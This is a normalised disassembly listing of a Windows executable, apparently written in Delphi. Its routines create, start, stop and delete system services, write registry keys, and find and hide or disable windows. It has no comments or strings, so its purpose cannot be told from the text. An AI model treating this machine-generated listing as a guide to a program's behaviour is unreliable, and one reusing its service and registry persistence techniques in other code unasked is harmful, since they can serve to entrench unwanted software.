mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x68 ]
call sub_40711c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
call sub_407024
lea eax [ ebp - 0x18 ]
call sub_40700c
push eax
lea eax [ ebp - 0x1c ]
call sub_405d28
push eax
lea edx [ ebp - 0x20 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x90 ]
call sub_40711c
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_405ea8
mov eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
call sub_40711c
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
call sub_407024
push 0xffffffff
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call sub_40648c
add esp 0x10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470a0a
lea eax [ ebp - 0x28 ]
call sub_40700c
lea eax [ ebp - 0x24 ]
call sub_405d28
lea eax [ ebp - 0x20 ]
call sub_40700c
lea eax [ ebp - 0x1c ]
call sub_405d28
lea eax [ ebp - 0x18 ]
call sub_40700c
lea eax [ ebp - 0x14 ]
call sub_40700c
lea eax [ ebp - 0x10 ]
call sub_40700c
lea eax [ ebp - 0xc ]
call sub_40700c
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_470a1c
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_470b4f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
call sub_40700c
push eax
lea edx [ ebp - 0x14 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x14 ]
push eax
mov eax [ eax ]
call [ eax + 0x68 ]
call sub_40711c
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0x8 ]
call sub_407024
lea eax [ ebp - 0x18 ]
call sub_40700c
push eax
lea eax [ ebp - 0x1c ]
call sub_405d28
push eax
lea edx [ ebp - 0x20 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x90 ]
call sub_40711c
mov eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_405ea8
mov eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ r-xdata ]
call sub_45eac4
mov eax [ ebp - 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
call sub_40711c
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
call sub_407024
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call sub_40648c
add esp 0x10
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470b56
lea eax [ ebp - 0x28 ]
call sub_40700c
lea eax [ ebp - 0x24 ]
call sub_405d28
lea eax [ ebp - 0x20 ]
call sub_40700c
lea eax [ ebp - 0x1c ]
call sub_405d28
lea eax [ ebp - 0x18 ]
call sub_40700c
lea eax [ ebp - 0x14 ]
call sub_40700c
lea eax [ ebp - 0x10 ]
call sub_40700c
lea eax [ ebp - 0xc ]
call sub_40700c
lea eax [ ebp - 0x8 ]
call sub_40700c
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_470b68
push ebx
mov ebx eax
mov eax ebx
call sub_405530
call sub_431a7c
mov dx 0x1
call sub_431a44
test al al
je r-xdata
pop ebx
retn
call sub_431a7c
mov edx ebx
call sub_431584
sub_470b94
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x114 ] edx
mov edi eax
xor eax eax
push ebp
push sub_470c74
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_405530
call sub_431a7c
mov dx 0xf
call sub_431970
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470c7b
lea eax [ ebp - 0x114 ]
call sub_405530
retn
mov eax [ ebp - 0x4 ]
push eax
call GlobalLock
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call DragQueryFileA
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
call GlobalUnlock
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
push [ edi ]
lea eax [ ebp - 0x114 ]
lea edx [ ebp - 0x10d ]
call sub_405728
push [ ebp - 0x114 ]
push r-xdata
mov eax edi
mov edx 0x3
call sub_4058e0
push 0x105
lea eax [ ebp - 0x10d ]
push eax
push esi
mov eax [ ebp - 0x8 ]
push eax
call DragQueryFileA
lea eax [ ebp - 0x10d ]
call sub_40a868
test eax eax
jbe r-xdata
sub_470c90
push ebx
push esi
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000001
mov eax ebx
call sub_4217a0
xor ecx ecx
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx esi
mov edx r-xdata
mov eax ebx
call sub_422068
pop esi
pop ebx
retn
sub_470d2c
push ebp
mov ebp esp
add esp 0xfffffe88
xor edx edx
mov [ ebp - 0x178 ] edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x174 ] eax
lea eax [ ebp - 0x170 ]
mov edx [ r-xdata ]
call sub_405fe8
xor eax eax
push ebp
push sub_470e93
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x174 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_470c90
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0x4 ]
call sub_40a290
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470e9a
lea eax [ ebp - 0x178 ]
call sub_405530
lea eax [ ebp - 0x170 ]
mov edx [ r-xdata ]
call sub_4060ac
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_405554
retn
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_40e830
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_4055c8
lea eax [ ebp - 0x178 ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x178 ]
lea ecx [ ebp - 0x170 ]
mov edx 0x2f
call sub_40a488
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_470e2f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
or ecx 0xffffffff
xchg edx eax
call sub_405a84
mov eax [ ebp - 0x174 ]
mov edx [ ebp - 0x8 ]
call sub_405584
sub eax 0x4
mov eax [ eax ]
push [ ebp - 0x8 ]
push [ ebp - 0x15c ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_4058e0
lea eax [ ebp - 0x170 ]
call sub_40a4d8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x170 ]
call sub_40a4fc
retn
sub_470ed4
push ebx
push esi
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov esi eax
mov edx 0x80000001
mov eax esi
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax esi
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax esi
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax esi
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax esi
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax esi
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax esi
call sub_4218e4
cmp bl 0x1
jne r-xdata
test bl bl
jne r-xdata
mov ecx r-xdata
mov edx r-xdata
mov eax esi
call sub_422008
jmp r-xdata
mov eax esi
call sub_421770
pop esi
pop ebx
retn
mov edx r-xdata
mov eax esi
call sub_421d50
sub_471010
cmp al 0x1
jne r-xdata
test al al
jne r-xdata
push 0xffffffff
push 0x0
push r-xdata
push 0x0
push 0x0
push r-xdata
call FindWindowA
push eax
call FindWindowExA
push eax
call EnableWindow
retn
retn
push 0x0
push 0x0
push r-xdata
push 0x0
push 0x0
push r-xdata
call FindWindowA
push eax
call FindWindowExA
push eax
call EnableWindow
sub_4710f0
push ebp
mov ebp esp
add esp 0xffffff78
push ebx
push esi
xor edx edx
mov [ ebp - 0x88 ] edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4711ba
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push r-xdata
call FindWindowA
push 0x5
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4711c1
lea eax [ ebp - 0x88 ]
call sub_405530
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push 0x80
lea eax [ ebp - 0x84 ]
push eax
push esi
call GetClassNameA
test eax eax
jle r-xdata
push 0x2
push esi
call GetWindow
mov esi eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x4 ]
lea eax [ ebp - 0x84 ]
call sub_40aaa8
lea edx [ ebp - 0x88 ]
mov eax [ ebp - 0x4 ]
call sub_4097dc
mov eax [ ebp - 0x88 ]
mov edx r-xdata
call sub_405974
jne r-xdata
cmp bl 0x1
jne r-xdata
push 0x0
push esi
call ShowWindow
push 0x1
push esi
call ShowWindow
jmp r-xdata
sub_4711e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
mov eax [ ebp - 0x8 ]
call sub_4059cc
mov eax [ ebp + 0x8 ]
call sub_4059cc
xor eax eax
push ebp
push sub_471291
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push esi
call RegCreateKeyA
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push esi
mov eax [ ebp + 0x8 ]
call sub_4059dc
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
mov eax [ ebp - 0xc ]
push eax
call RegSetValueExA
test eax eax
jne r-xdata
sub esi 0x4
mov esi [ esi ]
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471298
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
lea eax [ ebp + 0x8 ]
call sub_405530
retn
mov bl 0x1
sub_4712a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_471332
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_405864
mov edx [ ebp - 0x8 ]
xor ecx ecx
mov eax ebx
call sub_4218e4
mov ecx esi
mov edx r-xdata
mov eax ebx
call sub_422068
mov eax ebx
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471339
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_471380
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx r-xdata
call sub_405584
cmp esi 0x7
ja r-xdata
pop esi
pop ebx
retn
jmp [ esi * 4 + jump_table_4713a2 ]
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_405584
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_405584
sub_4714b8
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_47159e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_405530
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
push 0xf003f
push 0x0
push 0x0
call OpenSCManagerA
mov ebx eax
test ebx ebx
jbe r-xdata
mov edx esi
mov eax [ ebp - 0x28 ]
call sub_471380
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4715a5
lea eax [ ebp - 0x4 ]
call sub_405530
retn
cmp [ ebp - 0xc ] 0x1
sbb eax eax
inc eax
cmp al 0x1
jne r-xdata
mov edi 0x20
mov edi 0x10
jmp r-xdata
push ebx
call CloseServiceHandle
cmp [ ebp - 0x8 ] 0x1
sbb eax eax
inc eax
cmp al 0x1
jne r-xdata
or edi 0x4
push edi
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push ebx
call OpenServiceA
mov edi eax
test edi edi
jbe r-xdata
lea eax [ ebp - 0x2c ]
push eax
push edi
call QueryServiceStatus
push edi
call CloseServiceHandle
cmp [ ebp - 0xc ] 0x1
sbb eax eax
inc eax
cmp al 0x1
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
push 0x1
push edi
call ControlService
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push edi
call StartServiceA
jmp r-xdata
sub_4715b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_47162f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edi edi
push 0xf003f
push 0x0
push 0x0
call OpenSCManagerA
mov ebx eax
test ebx ebx
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471636
lea eax [ ebp - 0x4 ]
call sub_405530
retn
push 0x10000
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push ebx
call OpenServiceA
mov esi eax
test esi esi
jbe r-xdata
push ebx
call CloseServiceHandle
push esi
call DeleteService
test eax eax
je r-xdata
push esi
call CloseServiceHandle
or edi 0xffffffff
sub_471640
push ebp
mov ebp esp
push eax
mov eax 0x4
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xfffff7d8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4828 ] edx
mov [ ebp - 0x482c ] edx
mov [ ebp - 0x4820 ] edx
mov [ ebp - 0x4824 ] edx
mov [ ebp - 0x481c ] edx
mov [ ebp - 0x4818 ] edx
mov esi eax
xor eax eax
push ebp
push sub_471828
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_405530
push 0x5
push 0x0
push 0x0
call OpenSCManagerA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47182f
lea eax [ ebp - 0x482c ]
mov edx 0x6
call sub_405554
retn
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
inc edi
lea ebx [ ebp - 0x4814 ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x4800
lea eax [ ebp - 0x4814 ]
push eax
push 0x3
push 0x13f
mov eax [ ebp - 0x8 ]
push eax
call EnumServicesStatusA
mov edi [ ebp - 0x10 ]
dec edi
test edi edi
jl r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
jne r-xdata
cmp [ eax ] 0x0
mov eax [ ebp - 0x8 ]
push eax
call CloseServiceHandle
push [ esi ]
lea eax [ ebp - 0x4818 ]
mov edx [ ebx ]
call sub_405728
push [ ebp - 0x4818 ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
mov eax esi
mov edx r-xdata
call sub_405818
jmp r-xdata
jne r-xdata
cmp [ eax ] 0x0
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push [ esi ]
lea eax [ ebp - 0x481c ]
mov edx [ ebx + 0x4 ]
call sub_405728
push [ ebp - 0x481c ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
mov eax esi
mov edx r-xdata
call sub_405818
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
push [ esi ]
lea eax [ ebp - 0x4824 ]
mov edx [ ebx ]
call sub_405728
mov eax [ ebp - 0x4824 ]
lea edx [ ebp - 0x4820 ]
call sub_4712a4
push [ ebp - 0x4820 ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
push [ esi ]
lea eax [ ebp - 0x4828 ]
push eax
lea eax [ ebp - 0x482c ]
mov edx [ ebx ]
call sub_405728
mov eax [ ebp - 0x482c ]
xor ecx ecx
xor edx edx
call sub_4714b8
push [ ebp - 0x4828 ]
push r-xdata
mov eax esi
mov edx 0x3
call sub_4058e0
add ebx 0x24
dec edi
jne r-xdata
sub_471850
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_471976
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0xc ] eax
push 0xf003f
push 0x0
push 0x0
call OpenSCManagerA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47197d
lea eax [ ebp - 0x1c ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
xor eax eax
push ebp
push sub_47193b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_4059dc
push eax
push 0x0
push 0x2
push 0x110
push 0xf01ff
push esi
push esi
push ebx
call CreateServiceA
mov edi eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_405728
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx esi
call sub_405728
mov ecx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x18 ]
call sub_4059dc
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_405728
mov edx [ ebp - 0x14 ]
mov ecx r-xdata
mov eax 0x80000002
call sub_4711e8
push edi
call CloseServiceHandle
push ebx
call CloseServiceHandle
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0xc ] 0xffffffff
sub_4719c8
push ebx
push esi
push ecx
mov ebx eax
mov eax 0x104
call sub_40aabc
mov esi eax
push 0x104
push esi
call GetSystemDirectoryA
mov eax ebx
mov edx esi
call sub_405728
mov eax [ ebx ]
mov [ esp ] eax
mov eax [ esp ]
test eax eax
je r-xdata
mov edx [ ebx ]
cmp [ edx + eax - 0x1 ] 0x5c
je r-xdata
sub eax 0x4
mov eax [ eax ]
mov eax esi
call sub_40ab08
pop edx
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_405818
sub_471a2c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_471acf
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000001
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx esi
mov edx r-xdata
mov eax ebx
call sub_4220e0
mov eax ebx
call sub_421770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_471b6c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_471c0f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000001
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx esi
mov edx r-xdata
mov eax ebx
call sub_4220e0
mov eax ebx
call sub_421770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_471cb4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push j_sub_404b30#3
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000001
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
xor ecx ecx
mov edx r-xdata
mov eax ebx
call sub_4220e0
mov eax ebx
call sub_421770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_471dec
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_471e5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx r-xdata
mov edx r-xdata
mov eax ebx
call sub_422008
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_471edc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_471f86
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx esi
mov edx r-xdata
mov eax ebx
call sub_4220e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_47204c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_4720f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx esi
mov edx r-xdata
mov eax ebx
call sub_4220e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4721c4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_472245
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx 0x4
mov edx r-xdata
mov eax ebx
call sub_4220e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4722b4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_472327
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx r-xdata
mov edx r-xdata
mov eax ebx
call sub_422008
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4723a4
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push j_sub_404b30#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx r-xdata
mov edx r-xdata
mov eax ebx
call sub_422008
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4724fc
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_47256f
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4216c4
mov ebx eax
mov edx 0x80000002
mov eax ebx
call sub_4217a0
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov cl 0x1
mov edx r-xdata
mov eax ebx
call sub_4218e4
mov ecx r-xdata
mov edx r-xdata
mov eax ebx
call sub_422008
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4725ec
push ebp
mov ebp esp
push ebx
push esi
push edi
xor eax eax
push ebp
